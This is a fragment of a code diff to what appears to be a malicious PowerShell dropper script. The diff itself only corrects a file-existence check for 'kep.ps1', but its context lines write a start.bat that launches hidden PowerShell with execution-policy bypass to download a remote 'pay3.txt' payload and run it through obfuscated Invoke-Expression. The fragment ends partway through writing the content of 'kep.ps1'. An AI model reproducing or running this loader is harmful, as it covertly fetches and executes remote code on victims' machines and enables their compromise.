@@ -7,7 +7,7 @@ if (!($testbat)){
 New-Item start.bat
 Set-Content start.bat "powershell  -w hidden -Exec ByPass -NoProfile -c (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/haycurt/VPSSTUFF/master/pay3.txt') | iNvokE-EXPresSIon"
 }
-$testkep = kep.ps1
+$testkep = Test-Path kep.ps1
 if (!($testkep)){
 New-Item kep.ps1
 Set-Content kep.ps1 '
